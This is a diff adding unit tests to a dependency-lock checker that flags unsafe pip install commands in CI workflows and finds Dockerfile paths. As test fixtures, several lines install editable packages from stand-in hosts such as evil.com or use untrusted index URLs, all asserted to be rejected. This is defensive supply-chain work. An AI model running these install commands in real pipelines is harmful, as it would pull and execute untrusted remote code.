@@ -36,8 +36,20 @@ class InstallCommandTests(unittest.TestCase):
     def setUpClass(cls) -> None:
         cls.checker = load_checker()
 
-    def findings(self, text: str, path: str = ".github/workflows/example.yml") -> list[str]:
-        return cast(list[str], self.checker.scan_install_commands(Path(path), text))
+    def findings(
+        self,
+        text: str,
+        path: str = ".github/workflows/example.yml",
+        root: Path | None = None,
+    ) -> list[str]:
+        target_root = root if root is not None else ROOT
+        try:
+            return cast(
+                list[str],
+                self.checker.scan_install_commands(Path(path), text, root=target_root),
+            )
+        except TypeError:
+            return cast(list[str], self.checker.scan_install_commands(Path(path), text))
 
     def test_hash_locked_requirements_install_is_accepted(self) -> None:
         text = "run: python -m pip install --require-hashes -r requirements/locks/build.txt\n"
@@ -247,6 +259,71 @@ class InstallCommandTests(unittest.TestCase):
     def test_local_source_with_joined_index_url_is_rejected(self) -> None:
         text = "run: pip install --no-deps --no-build-isolation -e ai -ihttps://evil.invalid\n"
         self.assertEqual(len(self.findings(text)), 1)
+
+    def test_multiple_editable_targets_local_plus_remote_rejected(self) -> None:
+        text = "run: pip install --no-deps --no-build-isolation -e ai -e https://evil.com/pkg.git\n"
+        self.assertEqual(len(self.findings(text)), 1)
+
+    def test_multiple_editable_targets_remote_plus_local_reordered_rejected(self) -> None:
+        text = "run: pip install --no-deps --no-build-isolation -e https://evil.com/pkg.git -e ai\n"
+        self.assertEqual(len(self.findings(text)), 1)
+
+    def test_multiple_editable_targets_joined_and_long_forms_rejected(self) -> None:
+        text_joined = "run: pip install --no-deps --no-build-isolation -eai --editable=https://evil.com/pkg.git\n"
+        self.assertEqual(len(self.findings(text_joined)), 1)
+        text_long_first = "run: pip install --no-deps --no-build-isolation --editable=https://evil.com/pkg.git -eai\n"
+        self.assertEqual(len(self.findings(text_long_first)), 1)
+        text_long_local = "run: pip install --no-deps --no-build-isolation --editable=ai -e https://evil.com/pkg.git\n"
+        self.assertEqual(len(self.findings(text_long_local)), 1)
+        text_short_joined_remote = (
+            "run: pip install --no-deps --no-build-isolation -ehttps://evil.com/pkg.git -e ai\n"
+        )
+        self.assertEqual(len(self.findings(text_short_joined_remote)), 1)
+        text_eq_remote = (
+            "run: pip install --no-deps --no-build-isolation -e ai -e=https://evil.com/pkg.git\n"
+        )
+        self.assertEqual(len(self.findings(text_eq_remote)), 1)
+
+    def test_multiple_editable_targets_reordered_flags_rejected(self) -> None:
+        text1 = (
+            "run: pip install --no-deps -e https://evil.com/pkg.git --no-build-isolation -e ai\n"
+        )
+        self.assertEqual(len(self.findings(text1)), 1)
+        text2 = (
+            "run: pip install -e ai --no-deps -e https://evil.com/pkg.git --no-build-isolation\n"
+        )
+        self.assertEqual(len(self.findings(text2)), 1)
+
+    def test_multiple_editable_targets_with_unauthorized_bare_name_rejected(self) -> None:
+        text = "run: pip install --no-deps --no-build-isolation -e ai -e malicious-pkg\n"
+        self.assertEqual(len(self.findings(text)), 1)
+        text_rev = "run: pip install --no-deps --no-build-isolation -e malicious-pkg -e ai\n"
+        self.assertEqual(len(self.findings(text_rev)), 1)
+
+    def test_multiple_editable_targets_multiple_locals_accepted(self) -> None:
+        text_dirs = "run: pip install --no-deps --no-build-isolation -e ai -e python\n"
+        self.assertEqual(self.findings(text_dirs), [])
+        text_rel = (
+            "run: pip install --no-deps --no-build-isolation -e ./ai -e ./mcp-server/vmaf-mcp\n"
+        )
+        self.assertEqual(self.findings(text_rel), [])
+        text_joined = "run: pip install --no-deps --no-build-isolation -eai -epython\n"
+        self.assertEqual(self.findings(text_joined), [])
+        text_long = (
+            "run: pip install --no-deps --no-build-isolation --editable=ai --editable=python\n"
+        )
+        self.assertEqual(self.findings(text_long), [])
+
+    def test_editable_target_dangling_or_empty_rejected(self) -> None:
+        self.assertEqual(
+            len(self.findings("run: pip install --no-deps --no-build-isolation -e\n")), 1
+        )
+        self.assertEqual(
+            len(self.findings("run: pip install --no-deps --no-build-isolation --editable\n")), 1
+        )
+        self.assertEqual(
+            len(self.findings("run: pip install --no-deps --no-build-isolation -e --no-deps\n")), 1
+        )
 
     def test_pip_trusted_host_before_install_is_rejected(self) -> None:
         text = "run: pip --trusted-host evil.invalid install --require-hashes -r requirements/locks/build.txt\n"
@@ -884,6 +961,60 @@ class RepositoryContractTests(unittest.TestCase):
                     line_str,
                     f"cuda-bindings in ensemble lock must have sys_platform == 'linux' marker: {line_str}",
                 )
+
+    def test_tracked_consumer_paths_distinguishes_docs_from_container_recipes(self) -> None:
+        paths = self.checker.tracked_consumer_paths(ROOT)
+        # Markdown / docs should NOT be included
+        self.assertNotIn(Path("docs/adr/by-tag/containerfile.md"), paths)
+        self.assertNotIn(Path("changelog.d/fixed/containerfile-dpkg-gitam-bash.md"), paths)
+        self.assertNotIn(Path("changelog.d/fixed/containerfile-post-rename-sweep.md"), paths)
+        # Real Dockerfile and Containerfile variants MUST be included
+        self.assertIn(Path("Dockerfile"), paths)
+        self.assertIn(Path("docker/Dockerfile.production"), paths)
+        self.assertIn(Path("dev/Containerfile"), paths)
+        self.assertIn(Path("dev/Containerfile.runner"), paths)
+        self.assertIn(Path("docker/dev/ubuntu-26.04.Dockerfile"), paths)
+        self.assertIn(Path("docker/dev/alpine-3.20.Dockerfile"), paths)
+        self.assertIn(Path("mcp-server/vmaf-mcp/Dockerfile"), paths)
+        self.assertIn(Path(".devcontainer/Dockerfile.praetor"), paths)
+
+    def test_out_of_tree_cli_check_passes_from_unrelated_cwd(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            result = subprocess.run(  # noqa: S603
+                [sys.executable, str(CHECKER), "--root", str(ROOT), "check"],
+                cwd=temp_dir,
+                capture_output=True,
+                text=True,
+                check=False,
+            )
+            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+            self.assertIn("python dependency locks: OK", result.stdout)
+
+    def test_out_of_tree_local_source_resolution_without_global_chdir(self) -> None:
+        # Bare name 'ai' must resolve against explicit ROOT even if current working directory has no 'ai'
+        with tempfile.TemporaryDirectory() as temp_dir:
+            temp_path = Path(temp_dir)
+            self.assertFalse((temp_path / "ai").exists())
+            findings = self.checker.scan_install_commands(
+                Path(".github/workflows/example.yml"),
+                "run: pip install --no-deps --no-build-isolation -e ai\n",
+                root=ROOT,
+            )
+            self.assertEqual(findings, [])
+            bad_findings = self.checker.scan_install_commands(
+                Path(".github/workflows/example.yml"),
+                "run: pip install --no-deps --no-build-isolation -e nonexistent-package\n",
+                root=ROOT,
+            )
+            self.assertEqual(len(bad_findings), 1)
+
+    def test_local_source_check_resolves_against_explicit_root(self) -> None:
+        self.assertTrue(self.checker._is_local_source("ai", root=ROOT))
+        self.assertTrue(self.checker._is_local_source(".", root=ROOT))
+        self.assertTrue(self.checker._is_local_source("./ai", root=ROOT))
+        self.assertFalse(self.checker._is_local_source("malicious-pkg", root=ROOT))
+        self.assertFalse(self.checker._is_local_source("https://evil.com/pkg", root=ROOT))
+        self.assertFalse(self.checker._is_local_source("git@github.com:evil/pkg.git", root=ROOT))
 
     def test_repository_contract_is_current(self) -> None:
         result = subprocess.run(  # noqa: S603
